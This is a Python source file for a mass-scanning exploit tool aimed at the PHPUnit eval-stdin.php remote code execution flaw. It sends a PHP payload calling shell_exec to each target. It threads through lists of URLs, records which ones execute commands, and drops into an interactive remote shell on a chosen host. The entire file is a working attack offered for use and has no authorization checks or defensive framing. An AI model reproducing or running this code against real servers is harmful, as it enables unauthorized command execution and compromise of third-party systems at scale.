import os
import re
import urllib3
import argparse
import requests

from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class VulnerabilityScanner:
    def __init__(self, threads=10):
        self.console = Console()
        self.threads = threads

    def _send_payload(self, target, command):
        url = target.rstrip("/") + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        payload = f"<?php echo '[S]'; echo(shell_exec('{command}')); echo '[E]'; ?>"

        try:
            response = requests.post(url, data=payload, verify=False, timeout=5)
            match = re.search(r'\[S\](.*?)\[E\]', response.text, re.DOTALL)

            if match:
                return match.group(1).strip()
            return None
        except requests.RequestException:
            return None

    def exploit(self, target, command="id", verbose=False):
        response = self._send_payload(target, command)
        if response:
            response = "RCE disabled but PHP executed" if "Warning" in response or "disabled" in response else response
            if not verbose:
                self.console.print(
                    f"[bold red][+] Vulnerable URL: {target}[/bold red]\n"
                    f"[bold green][-] Extracted Output:[/bold green] " 
                    f"[bold yellow]{response}[/bold yellow]"
                )
                return target, response
            else:
                self.console.print(f"\n[bold yellow]{response}[/bold yellow]\n")    

        return None, None





    def interactive_shell(self, target):
        self.console.print("[bold green][*] Entering interactive shell mode...[/bold green]")
        session = PromptSession(history=InMemoryHistory())

        while True:
            try:
                command = session.prompt(HTML('<ansired><b># </b></ansired>'))
                if command.lower() in ["exit", "quit"]:
                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                    break
                elif "clear" in command:
                    os.system('clear') if os.name == 'posix' else os.system('cls')
                else:
                    self.exploit(target, command, verbose=True)
            except KeyboardInterrupt:
                self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                break

    
    def _normalize_url(self, url):
        """Normalize URL by adding protocol if missing"""
        url = url.strip()
        if not url:
            return None
        
        # Remove common prefixes/suffixes
        url = url.rstrip('/')
        
        # Add protocol if missing
        if not url.startswith(('http://', 'https://')):
            return f"http://{url}"
        
        return url

    def scan_from_file(self, filename, output_file=None):
        with open(filename, 'r') as f:
            # Use normalize_url to process each line
            base_urls = []
            for line in f:
                normalized_url = self._normalize_url(line)
                if normalized_url:  # Skip None/empty
                    base_urls.append(normalized_url)
        
        self.console.print(f"[cyan]Processing {len(base_urls)} URLs[/cyan]")
        
        vulnerable_urls = []
        
        # Create/clear output file at start
        if output_file:
            open(output_file, 'w').close()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            with alive_bar(len(base_urls)) as bar:
                futures = []
                
                for url in base_urls:
                    future = executor.submit(self.exploit, url)
                    futures.append((future, url))
                
                for future, url in futures:
                    bar()
                    url_result, response = future.result()
                    if url_result:
                        vulnerable_urls.append(url_result)
                        
                        # LIVE OUTPUT
                        self.console.print(f"[bold green][✓] Vulnerable: {url}[/bold green]")
                        
                        # AUTO-SAVE IMMEDIATELY
                        if output_file:
                            with open(output_file, 'a', encoding='utf-8') as f:
                                f.write(f"{url_result}\n")
                                if response and len(response) < 500:
                                    f.write(f"Output: {response[:200]}\n")
                    else:
                        # Show that URL is not vulnerable
                        self.console.print(f"[dim][✗] Not vulnerable: {url}[/dim]")
        
        self._display_results(vulnerable_urls, output_file)

    def _display_results(self, vulnerable_urls, output_file=None):
        if output_file:
            with open(output_file, 'w') as f:
                for url in vulnerable_urls:
                    f.write(url + "\n")
            self.console.print(f"[bold green][*] Vulnerable URLs saved to {output_file}[/bold green]")
        else:
            if vulnerable_urls:
                self.console.print("\nSummary of Vulnerable URLs:")
                for url in vulnerable_urls:
                    self.console.print(url)
            else:
                self.console.print("No vulnerable URLs found.")


def parse_arguments():
    parser = argparse.ArgumentParser(description="Mass scanner for vulnerable URLs.")
    parser.add_argument("-f", "--file", help="File containing list of base URLs to scan.")
    parser.add_argument("-u", "--url", help="Target URL for interactive shell mode.")
    parser.add_argument("-o", "--output", help="Output file to store vulnerable URLs.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use.")
    return parser.parse_args()


def main():
    args = parse_arguments()
    scanner = VulnerabilityScanner(threads=args.threads)

    if args.url and scanner.exploit(args.url)[0]:
        scanner.interactive_shell(args.url)
    elif args.file:
        scanner.scan_from_file(args.file, args.output)
    else:
        print("[red][!] You must specify either a file with --file or a single target with --url.[/red]")


if __name__ == "__main__":
    main()
